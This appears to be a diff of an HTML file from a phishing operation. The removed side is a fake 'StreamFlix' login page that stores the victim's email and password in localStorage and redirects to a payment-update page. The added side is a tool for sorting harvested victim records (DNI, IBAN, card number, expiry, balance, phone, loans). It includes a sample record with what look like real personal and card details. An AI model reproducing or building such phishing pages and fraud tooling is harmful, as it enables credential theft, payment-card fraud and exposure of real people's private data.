@@ -1,551 +1,521 @@
 <!DOCTYPE html>
-<html lang="es" class="">
+<html lang="es">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
-    <title>StreamFlix</title>
-    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
-    <link rel="shortcut icon" href="./streamflix/sficon2023.ico"/>
-    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Organizador de Datos Bancarios</title>
     <style>
-        @font-face {
-            font-family: "Streamflix Sans";
-            src: url("./streamflix/StreamflixSans_W_Rg.woff2") format("woff2");
-            font-weight: 400;
-            font-style: normal;
-            font-display: swap;
-        }
-        
-        @font-face {
-            font-family: "Streamflix Sans";
-            src: url("./streamflix/StreamflixSans_W_Bd.woff2") format("woff2");
-            font-weight: 700;
-            font-style: normal;
-            font-display: swap;
-        }
-
         * {
+            margin: 0;
+            padding: 0;
             box-sizing: border-box;
         }
 
         body {
-            margin: 0;
-            padding: 0;
-            font-family: "Streamflix Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background-color: #000;
-            color: #fff;
-            overflow-x: hidden;
-        }
-
-        .streamflix-login {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            background: linear-gradient(to bottom, rgba(0,0,0,.4) 0, rgba(0,0,0,.4) 100%), 
-                        url('./streamflix/ES-es-20250623-TRIFECTA-perspective_2ddcdaf0-f03e-4a6a-abe7-cb1910a6f2fd_large.jpg');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .streamflix-header {
-            padding: 20px 0;
-            position: relative;
-            z-index: 1;
-        }
-
-        .streamflix-logo {
-            margin-left: 3%;
-        }
-
-        .streamflix-logo img {
-            height: 45px;
-            width: auto;
-        }
-
-        .login-wrapper {
-            flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
 
-        .login-form-container {
-            background: rgba(0, 0, 0, 0.75);
-            border-radius: 4px;
-            padding: 48px 64px;
-            min-height: 660px;
-            width: 450px;
-            max-width: 450px;
-        }
-
-        .login-title {
-            color: #fff;
-            font-size: 32px;
-            font-weight: 700;
-            margin-bottom: 28px;
-            margin-top: 0;
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 16px;
-        }
-
-        .input-field {
-            background: #333;
-            border: 1px solid #333;
-            border-radius: 4px;
-            color: #fff;
-            font-size: 16px;
-            height: 56px;
-            padding: 24px 16px 8px;
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 1200px;
             width: 100%;
-            outline: none;
-            transition: all 0.2s ease;
+            padding: 40px;
+            animation: slideIn 0.5s ease-out;
         }
 
-        .input-field:focus {
-            background: #454545;
-            border-color: #fff;
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
-        .input-field.error {
-            border-color: #e87c03;
-        }
-
-        .input-label {
-            color: #8c8c8c;
-            font-size: 16px;
-            left: 16px;
-            position: absolute;
-            top: 16px;
-            transition: font-size .1s ease, top .1s ease, color .1s ease;
-            pointer-events: none;
-        }
-
-        .input-field:focus + .input-label,
-        .input-field:not(:placeholder-shown) + .input-label,
-        .input-field[data-has-value] + .input-label {
-            color: #8c8c8c;
-            font-size: 11px;
-            top: 6px;
-        }
-
-        .error-message {
-            color: #e87c03;
-            font-size: 13px;
-            margin-top: 6px;
-            display: none;
-            align-items: center;
-        }
-
-        .error-message.show {
-            display: flex;
-        }
-
-        .error-message::before {
-            content: "⚠";
-            margin-right: 6px;
-            font-size: 16px;
-        }
-
-        .login-btn {
-            background: #e50914;
-            border: none;
-            border-radius: 4px;
-            color: #fff;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 700;
-            height: 48px;
-            margin-bottom: 12px;
-            margin-top: 24px;
-            width: 100%;
-            transition: background-color 0.2s ease;
-        }
-
-        .login-btn:hover {
-            background: #f40612;
-        }
-
-        .or-text {
-            color: #737373;
-            font-size: 16px;
-            margin: 16px 0;
+        h1 {
+            color: #333;
             text-align: center;
+            margin-bottom: 10px;
+            font-size: 2.5em;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
-        .code-btn {
-            background: #737373;
-            border: none;
-            border-radius: 4px;
-            color: #fff;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 500;
-            height: 48px;
-            padding: 0;
-            margin: 0 0 16px 0;
-            width: 100%;
-            transition: background-color 0.2s ease;
-        }
-
-        .code-btn:hover {
-            background: #8c8c8c;
-        }
-
-        .forgot-link {
-            color: #fff;
-            text-decoration: underline;
-            font-size: 16px;
-            margin: 16px 0;
-            display: block;
-        }
-
-        .forgot-link:hover {
-            text-decoration: none;
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            margin: 20px 0;
-        }
-
-        .checkbox {
-            appearance: none;
-            background: #333;
-            border: 1px solid #333;
-            border-radius: 2px;
-            width: 16px;
-            height: 16px;
-            margin-right: 8px;
-            position: relative;
-            cursor: pointer;
-        }
-
-        .checkbox:checked {
-            background: #fff;
-            border-color: #fff;
-        }
-
-        .checkbox:checked::after {
-            content: '✓';
-            position: absolute;
-            top: -2px;
-            left: 2px;
-            color: #000;
-            font-size: 12px;
-            font-weight: bold;
-        }
-
-        .checkbox-label {
-            color: #b3b3b3;
-            font-size: 13px;
-        }
-
-        .signup-text {
-            color: #737373;
-            font-size: 16px;
-            margin: 20px 0;
-        }
-
-        .signup-text a {
-            color: #fff;
-            text-decoration: none;
-        }
-
-        .signup-text a:hover {
-            text-decoration: underline;
-        }
-
-        .recaptcha-text {
-            color: #8c8c8c;
-            font-size: 13px;
-            margin: 16px 0 8px 0;
-            line-height: 1.4;
-        }
-
-        .recaptcha-link {
-            background: transparent;
-            border: none;
-            color: #0071eb;
-            cursor: pointer;
-            font-size: 13px;
-            text-decoration: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        .recaptcha-link:hover {
-            text-decoration: underline;
-        }
-
-        .streamflix-footer {
-            background: rgba(0, 0, 0, 0.75);
-            padding: 30px 0;
-            margin-top: auto;
-        }
-
-        .footer-content {
-            max-width: 1000px;
-            margin: 0 auto;
-            padding: 0 45px;
-        }
-
-        .footer-content p {
-            color: #737373;
-            font-size: 13px;
+        .subtitle {
+            text-align: center;
+            color: #666;
             margin-bottom: 30px;
         }
 
-        .footer-content a {
-            color: #737373;
-            text-decoration: none;
+        .input-section, .output-section {
+            margin-bottom: 30px;
         }
 
-        .footer-content a:hover {
-            text-decoration: underline;
+        label {
+            display: block;
+            margin-bottom: 10px;
+            color: #555;
+            font-weight: 600;
+            font-size: 1.1em;
         }
 
-        .footer-links {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 15px;
+        textarea {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            resize: vertical;
+            transition: border-color 0.3s;
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .secondary-button {
+            background: #f0f0f0;
+            color: #333;
+        }
+
+        .secondary-button:hover {
+            background: #e0e0e0;
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .output-container {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid #e0e0e0;
+            min-height: 300px;
+            position: relative;
+        }
+
+        .output-content {
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            line-height: 1.6;
+            color: #333;
+        }
+
+        .section-header {
+            color: #667eea;
+            font-weight: bold;
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 5px;
+            margin: 20px 0 10px 0;
+        }
+
+        .data-row {
+            margin: 5px 0;
+            padding: 5px 0;
+        }
+
+        .data-label {
+            color: #555;
+            font-weight: 600;
+        }
+
+        .data-value {
+            color: #333;
+        }
+
+        .success-message {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #4caf50;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            display: none;
+            animation: slideInRight 0.3s ease-out;
+        }
+
+        @keyframes slideInRight {
+            from {
+                transform: translateX(100%);
+            }
+            to {
+                transform: translateX(0);
+            }
+        }
+
+        .empty-state {
+            text-align: center;
+            color: #999;
+            padding: 50px;
+        }
+
+        .empty-state svg {
+            width: 100px;
+            height: 100px;
             margin-bottom: 20px;
+            opacity: 0.5;
         }
 
-        .footer-links a {
-            font-size: 13px;
-            line-height: 1.4;
-        }
-
-        .language-selector {
-            margin-top: 20px;
-        }
-
-        .language-selector select {
-            background: #000;
-            border: 1px solid #333;
-            border-radius: 4px;
-            color: #fff;
-            font-size: 13px;
-            padding: 8px 12px;
-        }
-
-        @media (max-width: 740px) {
-            .login-form-container {
-                background: transparent;
+        @media (max-width: 768px) {
+            .container {
                 padding: 20px;
+            }
+            
+            h1 {
+                font-size: 2em;
+            }
+            
+            .button-group {
+                flex-direction: column;
+            }
+            
+            button {
                 width: 100%;
-                min-height: auto;
-            }
-
-            .login-wrapper {
-                padding: 0;
-            }
-
-            .footer-links {
-                grid-template-columns: repeat(2, 1fr);
-            }
-
-            .streamflix-logo {
-                margin-left: 20px;
-            }
-
-            .streamflix-logo img {
-                height: 25px;
-            }
-        }
-
-        @media (max-width: 500px) {
-            .footer-links {
-                grid-template-columns: 1fr;
             }
         }
     </style>
 </head>
 <body>
-    <div class="streamflix-login">
-        <div class="streamflix-header">
-            <div class="streamflix-logo">
-                <img src="./streamflix/Streamflix_Logo_PMS.png" alt="StreamFlix">
-            </div>
+    <div class="container">
+        <h1>💳 Organizador de Datos Bancarios</h1>
+        <p class="subtitle">Pega los datos desordenados y los organizaré automáticamente</p>
+        
+        <div class="input-section">
+            <label for="inputData">📋 Pega aquí los datos:</label>
+            <textarea id="inputData" rows="6" placeholder="Ejemplo: 52898137T:09081994 | Nombre = ZUBIETA JIMENEZ PAULA MARIA | IBAN = ES 24 00491643712110197138..."></textarea>
         </div>
-
-        <div class="login-wrapper">
-            <div class="login-form-container">
-                <form id="loginForm">
-                    <h1 class="login-title">Iniciar sesión</h1>
-                    
-                    <div class="input-group">
-                        <input type="text" class="input-field" id="userLoginId" name="userLoginId" placeholder=" " autocomplete="email">
-                        <label class="input-label" for="userLoginId">Correo o número de móvil</label>
-                        <div class="error-message" id="emailError">Introduce un email válido (ejemplo@gmail.com) o teléfono móvil español (6XXXXXXXX o 7XXXXXXXX).</div>
-                    </div>
-
-                    <div class="input-group">
-                        <input type="password" class="input-field" id="password" name="password" placeholder=" " autocomplete="password">
-                        <label class="input-label" for="password">Contraseña</label>
-                        <div class="error-message" id="passwordError">La contraseña debe tener entre 6 y 60 caracteres.</div>
-                    </div>
-
-                    <button type="submit" class="login-btn">Iniciar sesión</button>
-
-                    <p class="or-text">O</p>
-
-                    <button type="button" class="code-btn">Usar un código de inicio de sesión</button>
-
-                    <a href="#" class="forgot-link">¿Has olvidado tu contraseña?</a>
-
-                    <div class="checkbox-group">
-                        <input type="checkbox" class="checkbox" id="rememberMe" name="rememberMe" checked>
-                        <label class="checkbox-label" for="rememberMe">Recordarme</label>
-                    </div>
-
-                    <div class="signup-text">¿Primera vez en StreamFlix? <a href="/">Suscríbete ya.</a></div>
-
-                    <p class="recaptcha-text">Esta página utiliza Google reCAPTCHA para garantizar que no eres un robot.</p>
-                    
-                    <button type="button" class="recaptcha-link">Más información.</button>
-                </form>
-            </div>
+        
+        <div class="button-group">
+            <button onclick="organizarDatos()">✨ Organizar Datos</button>
+            <button class="secondary-button" onclick="limpiarTodo()">🗑️ Limpiar Todo</button>
+            <button class="secondary-button" onclick="cargarEjemplo()">📝 Cargar Ejemplo</button>
         </div>
-
-        <div class="streamflix-footer">
-            <div class="footer-content">
-                <p>¿Preguntas? Llama al <a href="tel:900866617">900 866 617</a></p>
-                
-                <div class="footer-links">
-                    <a href="#">Preguntas frecuentes</a>
-                    <a href="#">Centro de ayuda</a>
-                    <a href="#">Condiciones de uso</a>
-                    <a href="#">Privacidad</a>
-                    <a href="#">Preferencias de cookies</a>
-                    <a href="#">Información corporativa</a>
+        
+        <div class="output-section">
+            <label>📊 Datos Organizados:</label>
+            <div class="output-container">
+                <div id="outputData" class="output-content">
+                    <div class="empty-state">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                        </svg>
+                        <p>Los datos organizados aparecerán aquí</p>
+                    </div>
                 </div>
-
-                <div class="language-selector">
-                    <select>
-                        <option value="es">Español</option>
-                        <option value="en">English</option>
-                    </select>
-                </div>
+                <button id="copyButton" style="display:none; margin-top: 15px;" onclick="copiarAlPortapapeles()">📋 Copiar al Portapapeles</button>
             </div>
         </div>
     </div>
+    
+    <div class="success-message" id="successMessage">
+        ✅ Copiado al portapapeles
+    </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Validación en tiempo real del campo email/teléfono
-            document.getElementById('userLoginId').addEventListener('input', function() {
-                const email = document.getElementById('userLoginId');
-                const emailError = document.getElementById('emailError');
-                const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-                const phoneRegex = /^[67][0-9]{8}$/;
+        function parsearDatos(texto) {
+            // Objeto para almacenar los datos parseados
+            const datos = {};
+            
+            // Eliminar los dos puntos después del DNI
+            texto = texto.replace(/^(\d{8}[A-Z]):(\d{8})/, '$1 $2');
+            
+            // Separar por pipes y procesar cada campo
+            const campos = texto.split('|');
+            
+            campos.forEach(campo => {
+                campo = campo.trim();
                 
-                const inputValue = email.value.trim();
-                
-                // Si el campo está vacío o es válido, quitar error
-                if (!inputValue || 
-                    (inputValue.includes('@') && emailRegex.test(inputValue)) ||
-                    (!inputValue.includes('@') && phoneRegex.test(inputValue))) {
-                    email.classList.remove('error');
-                    emailError.classList.remove('show');
-                }
-            });
-
-            // Funcionalidad del formulario
-            document.getElementById('loginForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const email = document.getElementById('userLoginId');
-                const password = document.getElementById('password');
-                const emailError = document.getElementById('emailError');
-                const passwordError = document.getElementById('passwordError');
-                
-                // Reset errors
-                email.classList.remove('error');
-                password.classList.remove('error');
-                emailError.classList.remove('show');
-                passwordError.classList.remove('show');
-                
-                let hasError = false;
-                
-                // Validación estricta de email o número de teléfono español
-                const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-                const phoneRegex = /^[67][0-9]{8}$/; // Teléfonos españoles: empiezan por 6 o 7 y tienen exactamente 9 dígitos
-                
-                const inputValue = email.value.trim();
-                
-                if (!inputValue) {
-                    email.classList.add('error');
-                    emailError.classList.add('show');
-                    hasError = true;
-                } else if (inputValue.includes('@')) {
-                    // Si contiene @, debe ser un email válido
-                    if (!emailRegex.test(inputValue)) {
-                        email.classList.add('error');
-                        emailError.classList.add('show');
-                        hasError = true;
-                    }
-                } else {
-                    // Si no contiene @, debe ser un teléfono válido
-                    if (!phoneRegex.test(inputValue)) {
-                        email.classList.add('error');
-                        emailError.classList.add('show');
-                        hasError = true;
-                    }
+                // Buscar DNI al inicio
+                const dniMatch = campo.match(/^(\d{8}[A-Z])\s+(\d{8})/);
+                if (dniMatch) {
+                    datos.dni = dniMatch[1];
+                    datos.fechaDniNumero = dniMatch[2];
+                    // Convertir fecha del DNI
+                    const dia = dniMatch[2].substring(0, 2);
+                    const mes = dniMatch[2].substring(2, 4);
+                    const año = dniMatch[2].substring(4, 8);
+                    datos.fechaNacimientoDNI = `${dia}/${mes}/${año}`;
+                    return;
                 }
                 
-                // Validación estricta de contraseña
-                if (!password.value || password.value.length < 6 || password.value.length > 60) {
-                    password.classList.add('error');
-                    passwordError.classList.add('show');
-                    hasError = true;
-                }
-                
-                if (!hasError) {
-                    // Guardar credenciales en localStorage para usarlas después
-                    localStorage.setItem('streamflix_email', email.value);
-                    localStorage.setItem('streamflix_password', password.value);
+                // Buscar pares clave = valor
+                const parMatch = campo.match(/(.+?)\s*=\s*(.+)/);
+                if (parMatch) {
+                    const clave = parMatch[1].trim();
+                    const valor = parMatch[2].trim();
                     
-                    // Redirigir a la página de actualización de método de pago
-                    window.location.href = 'payment.html';
+                    switch(clave.toLowerCase()) {
+                        case 'nombre':
+                            datos.nombre = valor;
+                            break;
+                        case 'iban':
+                            datos.iban = valor.replace(/\s+/g, ' ').trim();
+                            break;
+                        case 'operativa':
+                            datos.operativa = valor;
+                            break;
+                        case 'firma':
+                            datos.firma = valor;
+                            break;
+                        case 'fechadenacimiento':
+                            // Convertir formato de fecha
+                            const fechaParts = valor.split('-');
+                            if (fechaParts.length === 3) {
+                                datos.fechaNacimiento = `${fechaParts[2]}/${fechaParts[1]}/${fechaParts[0]}`;
+                            } else {
+                                datos.fechaNacimiento = valor;
+                            }
+                            break;
+                        case 'saldodisponible':
+                            datos.saldo = valor;
+                            break;
+                        case 'tarjeta':
+                            // Formatear número de tarjeta
+                            datos.tarjeta = valor.match(/.{1,4}/g).join(' ');
+                            break;
+                        case 'exp':
+                            datos.expiracion = valor;
+                            break;
+                        case 'limite':
+                            datos.limite = valor;
+                            break;
+                        case 'phone':
+                            // Formatear teléfono
+                            const phoneClean = valor.replace(/\D/g, '');
+                            if (phoneClean.length >= 9) {
+                                const countryCode = phoneClean.substring(0, phoneClean.length - 9);
+                                const phone = phoneClean.substring(phoneClean.length - 9);
+                                datos.telefono = `+${countryCode} ${phone.substring(0,3)} ${phone.substring(3,6)} ${phone.substring(6)}`;
+                            } else {
+                                datos.telefono = valor;
+                            }
+                            break;
+                        case 'prestamo':
+                            // Parsear préstamos
+                            const prestamosStr = valor.replace(/[\[\]]/g, '');
+                            const prestamos = prestamosStr.split(',').map(p => p.trim());
+                            datos.prestamos = prestamos;
+                            // Calcular total
+                            let total = 0;
+                            prestamos.forEach(p => {
+                                const montoMatch = p.match(/(\d+)/);
+                                if (montoMatch) {
+                                    total += parseInt(montoMatch[1]);
+                                }
+                            });
+                            datos.totalPrestamos = `${total.toLocaleString('es-ES')} EUR`;
+                            break;
+                    }
                 }
             });
-
-            // Labels flotantes
-            document.querySelectorAll('.input-field').forEach(input => {
-                input.addEventListener('input', function() {
-                    if (this.value) {
-                        this.setAttribute('data-has-value', '');
+            
+            return datos;
+        }
+        
+        function formatearDatosOrganizados(datos) {
+            let resultado = '';
+            
+            // Sección de Información Personal
+            resultado += '=====================================\n';
+            resultado += 'INFORMACIÓN PERSONAL Y BANCARIA\n';
+            resultado += '=====================================\n\n';
+            
+            if (datos.dni) {
+                resultado += `DNI: ${datos.dni}`;
+                if (datos.fechaDniNumero) {
+                    resultado += ` ${datos.fechaDniNumero}`;
+                }
+                resultado += '\n';
+            }
+            
+            if (datos.nombre) {
+                resultado += `Nombre: ${datos.nombre}\n`;
+            }
+            
+            if (datos.fechaNacimiento) {
+                resultado += `Fecha de Nacimiento: ${datos.fechaNacimiento}\n`;
+            }
+            
+            if (datos.telefono) {
+                resultado += `Teléfono: ${datos.telefono}\n`;
+            }
+            
+            // Sección Bancaria
+            resultado += '\n=====================================\n';
+            resultado += 'INFORMACIÓN BANCARIA\n';
+            resultado += '=====================================\n\n';
+            
+            if (datos.iban) {
+                // Formatear IBAN en grupos de 4
+                const ibanLimpio = datos.iban.replace(/\s+/g, '');
+                const ibanFormateado = ibanLimpio.match(/.{1,4}/g).join(' ');
+                resultado += `IBAN: ${ibanFormateado}\n`;
+            }
+            
+            if (datos.saldo) {
+                resultado += `Saldo Disponible: ${datos.saldo}\n`;
+            }
+            
+            if (datos.operativa) {
+                resultado += `Estado Operativa: ${datos.operativa}\n`;
+            }
+            
+            if (datos.firma) {
+                resultado += `Estado Firma: ${datos.firma}\n`;
+            }
+            
+            // Sección de Tarjeta
+            if (datos.tarjeta || datos.expiracion || datos.limite) {
+                resultado += '\n=====================================\n';
+                resultado += 'INFORMACIÓN DE TARJETA\n';
+                resultado += '=====================================\n\n';
+                
+                if (datos.tarjeta) {
+                    resultado += `Número de Tarjeta: ${datos.tarjeta}\n`;
+                }
+                
+                if (datos.expiracion) {
+                    resultado += `Fecha de Expiración: ${datos.expiracion}\n`;
+                }
+                
+                if (datos.limite) {
+                    resultado += `Límite: ${datos.limite}\n`;
+                }
+            }
+            
+            // Sección de Préstamos
+            if (datos.prestamos && datos.prestamos.length > 0) {
+                resultado += '\n=====================================\n';
+                resultado += 'PRÉSTAMOS\n';
+                resultado += '=====================================\n\n';
+                
+                datos.prestamos.forEach((prestamo, index) => {
+                    // Formatear el monto del préstamo
+                    const montoMatch = prestamo.match(/(\d+)/);
+                    if (montoMatch) {
+                        const monto = parseInt(montoMatch[1]).toLocaleString('es-ES');
+                        resultado += `Préstamo ${index + 1}: ${monto} EUR\n`;
                     } else {
-                        this.removeAttribute('data-has-value');
+                        resultado += `Préstamo ${index + 1}: ${prestamo}\n`;
                     }
                 });
-            });
-
-            // Botón código de inicio
-            document.querySelector('.code-btn').addEventListener('click', function(e) {
-                e.preventDefault();
-                alert('Código de inicio de sesión');
-            });
-
-            // Olvidé contraseña
-            document.querySelector('.forgot-link').addEventListener('click', function(e) {
-                e.preventDefault();
-                alert('Recuperar contraseña');
-            });
-
-            // reCAPTCHA info
-            document.querySelector('.recaptcha-link').addEventListener('click', function(e) {
-                e.preventDefault();
-                alert('Información reCAPTCHA');
-            });
+                
+                if (datos.totalPrestamos) {
+                    resultado += `Total Préstamos: ${datos.totalPrestamos}\n`;
+                }
+            }
+            
+            return resultado;
+        }
         
-        }); // Cierre del DOMContentLoaded
+        function organizarDatos() {
+            const inputData = document.getElementById('inputData').value.trim();
+            
+            if (!inputData) {
+                alert('Por favor, pega los datos que quieres organizar');
+                return;
+            }
+            
+            try {
+                const datosParsed = parsearDatos(inputData);
+                const datosOrganizados = formatearDatosOrganizados(datosParsed);
+                
+                document.getElementById('outputData').textContent = datosOrganizados;
+                document.getElementById('copyButton').style.display = 'block';
+                
+                // Animación de éxito
+                document.querySelector('.output-container').style.animation = 'none';
+                setTimeout(() => {
+                    document.querySelector('.output-container').style.animation = 'slideIn 0.5s ease-out';
+                }, 10);
+                
+            } catch (error) {
+                alert('Error al procesar los datos. Por favor, verifica el formato.');
+                console.error(error);
+            }
+        }
+        
+        function copiarAlPortapapeles() {
+            const outputData = document.getElementById('outputData').textContent;
+            
+            navigator.clipboard.writeText(outputData).then(() => {
+                const successMsg = document.getElementById('successMessage');
+                successMsg.style.display = 'block';
+                setTimeout(() => {
+                    successMsg.style.display = 'none';
+                }, 3000);
+            }).catch(err => {
+                alert('Error al copiar al portapapeles');
+                console.error(err);
+            });
+        }
+        
+        function limpiarTodo() {
+            document.getElementById('inputData').value = '';
+            document.getElementById('outputData').innerHTML = `
+                <div class="empty-state">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                    </svg>
+                    <p>Los datos organizados aparecerán aquí</p>
+                </div>
+            `;
+            document.getElementById('copyButton').style.display = 'none';
+        }
+        
+        function cargarEjemplo() {
+            const ejemplo = `52898137T:09081994 | Nombre = ZUBIETA JIMENEZ PAULA MARIA | IBAN = ES 24 00491643712110197138 | Operativa = Operativa | Firma = Activa | FechaDeNacimiento = 1994-08-09 | SaldoDisponible = +30.00 EUR | Tarjeta = 5163830305842926 | EXP = 08/2027 | Limite = 0 EUR | Phone = +34665395918 | PRESTAMO = [5000 EUR, 3000 EUR]`;
+            document.getElementById('inputData').value = ejemplo;
+            organizarDatos();
+        }
+        
+        // Permitir organizar con Enter (Ctrl+Enter)
+        document.getElementById('inputData').addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'Enter') {
+                organizarDatos();
+            }
+        });
     </script>
 </body>
 </html>
